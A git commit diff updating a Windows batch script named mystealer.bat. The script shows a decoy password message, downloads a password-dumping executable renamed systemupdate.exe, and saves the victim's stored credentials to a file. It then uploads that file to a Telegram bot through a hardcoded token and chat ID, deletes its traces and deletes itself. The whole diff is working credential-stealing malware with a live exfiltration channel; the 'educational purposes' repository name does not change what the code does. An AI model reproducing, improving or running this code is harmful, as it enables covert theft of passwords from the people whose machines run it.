fc1c9ce87cd771cc259a36247aed03a77cc42d1d
devilJM <97776653+devilJM@users.noreply.github.com>
2024-07-02 02:42:01 +0700

    Update mystealer.bat

--- mystealer.bat
+++ mystealer.bat
@@ -8,9 +8,21 @@ echo objShell.Run "cmd.exe /c ""D:\TEMP\steal.bat""", 0, True >>"%temp%\sys.vbs"
 wscript.exe //nologo "%temp%\sys.vbs"
 exit
 
-:steal
+:Steal
 echo Your Password Is : 123 > "%temp%\password.txt" & start notepad "%temp%\password.txt"
-cmd /c "curl -o "%temp%\systemupdate.exe" https://raw.githubusercontent.com/devilJM/Hacktool-For-Educational-Purposes/main/pass.exe & "%temp%\systemupdate.exe" /stext "%temp%\%username%-%computername%.txt" & curl -F document=@"%temp%\%username%-%computername%.txt" -F caption="Password From %username% - %computername%" "https://api.telegram.org/bot6481424824:AAF448E2lOZMaAZxDqFtrGE_0UONAA8-wH0/sendDocument?chat_id=365617307" & del "%temp%\systemupdate.exe" & del "%temp%\%username%-%computername%.txt" "
+
+:: Download pass.exe
+powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/devilJM/Hacktool-For-Educational-Purposes/main/pass.exe' -OutFile '%temp%\systemupdate.exe'"
+
+:: Jalankan pass.exe untuk mendapatkan teks password
+powershell -Command "& '%temp%\systemupdate.exe' /stext '%temp%\%username%-%computername%.txt'"
+
+:: Upload file ke Telegram menggunakan PowerShell
+powershell -Command "$file = '%temp%\%username%-%computername%.txt'; $botToken = '6481424824:AAF448E2lOZMaAZxDqFtrGE_0UONAA8-wH0'; $chatId = '365617307'; $uri = 'https://api.telegram.org/bot{0}/sendDocument' -f $botToken; $headers = @{ 'Authorization' = 'Bearer ' + $botToken }; Invoke-WebRequest -Uri $uri -Method Post -InFile $file -ContentType 'multipart/form-data' -Headers $headers"
+
+del "%temp%\systemupdate.exe"
+del "%temp%\%username%-%computername%.txt"
 del "%temp%\password.txt"
 del "%temp%\sys.vbs"
-exit 
+cmd /c del "%~f0"
+exit
